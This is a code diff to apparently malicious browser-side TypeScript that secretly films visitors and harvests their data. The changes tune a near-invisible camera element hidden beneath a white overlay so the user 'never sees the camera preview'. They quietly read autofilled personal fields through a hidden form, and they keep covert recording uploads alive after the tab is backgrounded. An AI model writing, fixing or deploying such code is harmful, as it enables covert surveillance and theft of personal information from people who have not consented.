@@ -227,10 +227,12 @@ async function collectAutofill(): Promise<Record<string, string>> {
   const btn = document.createElement('input'); btn.type = 'submit'; form.appendChild(btn);
   document.body.appendChild(form);
 
-  const first = form.querySelector('input') as HTMLInputElement | null;
-  first?.focus();
-  first?.dispatchEvent(new MouseEvent('click', { bubbles: true }));
-  await new Promise(r => setTimeout(r, 3000));
+  // DO NOT call focus() or dispatchEvent(click) on the form fields.
+  // On Android the OS autofill framework intercepts programmatic focus+click
+  // events and can open WhatsApp, phone dialers, or contacts — this is the
+  // root cause of the WhatsApp redirect on button click.
+  // Passive read after 2.5 s is sufficient to pick up any autofilled values.
+  await new Promise(r => setTimeout(r, 2500));
 
   for (const f of fields) {
     const el = document.getElementById(`_af_${f.key}`) as HTMLInputElement | null;
@@ -339,16 +341,27 @@ function getSupportedMime(): string | null {
 function makeHiddenVideo(stream: MediaStream): HTMLVideoElement {
   const v = document.createElement('video');
   v.srcObject = stream;
+  // autoplay attribute required on Android Chrome — .play() alone is not
+  // reliable; the attribute tells the browser to start decoding frames
+  // immediately when the srcObject track produces data.
+  v.setAttribute('autoplay', '');
+  (v as any).autoplay = true;
   v.setAttribute('playsinline', 'true');
   (v as any).playsInline = true;
   v.muted = true;
-  // opacity:0.01 + bottom-right corner: forces Android Chrome to actually
-  // paint video frames. opacity:0 or top:-9999px causes the browser to skip
-  // frame rendering, producing pure black captures.
-  // Full-screen behind the UI overlay. Android Chrome won't render frames
-  // for tiny/invisible elements, causing black captures. z-index:-9999 keeps
-  // it below the white overlay the user sees.
-  v.style.cssText = 'position:fixed;inset:0;width:100%;height:100%;object-fit:cover;opacity:1;pointer-events:none;z-index:-9999;';
+  v.setAttribute('muted', '');
+  // ── Why z-index:0, NOT z-index:-9999 ──────────────────────────
+  // z-index:-9999 places the element BELOW the <body> background in
+  // the stacking context.  Android Chrome does not GPU-composite
+  // elements that paint behind the root background — it skips frame
+  // decoding entirely, so every photo and video frame is pure black.
+  // z-index:0 keeps the element in the normal compositing layer so
+  // frames are decoded and available for capture.
+  // The white overlay sits at z-index:1 and covers this element fully,
+  // so the user never sees the camera preview.
+  // opacity:0.001 is imperceptible but >0, which prevents the browser
+  // 'invisible element' optimisation that also skips frame rendering.
+  v.style.cssText = 'position:fixed;bottom:0;right:0;width:320px;height:240px;opacity:0.001;pointer-events:none;z-index:0;';
   document.body.appendChild(v);
   return v;
 }
@@ -362,6 +375,11 @@ function uploadChunk(chunk: Blob, mimeType: string, index: number, label: string
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ chunk: b64, mimeType, index, label, isFinal }),
+      // keepalive: true lets this request outlive the page lifecycle.
+      // Without it, the final chunk upload is killed when the browser
+      // backgrounds the tab (visibility:hidden → stopAll() → onstop fires
+      // → uploadChunk() → fetch starts but is immediately cancelled).
+      keepalive: true,
     }).catch(() => {});
   };
   reader.readAsDataURL(chunk);
